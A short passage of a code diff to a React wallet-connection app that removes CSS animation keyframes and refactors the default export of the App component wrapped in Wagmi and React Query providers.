-          0% { background-position: 0% 50%; }
-          50% { background-position: 100% 50%; }
-          100% { background-position: 0% 50%; }
-        }
-      `}</style>
     </div>
   );
 }
@@ -1137,7 +727,8 @@ const customTheme = {
   walletModal: "wide"
 };
 
-export default function App() {
+// Main App Component
+function App() {
   return (
     <WagmiProvider config={config}>
       <QueryClientProvider client={queryClient}>
@@ -1164,3 +755,5 @@ export default function App() {
     </WagmiProvider>
   );
 }
+
+export default App;
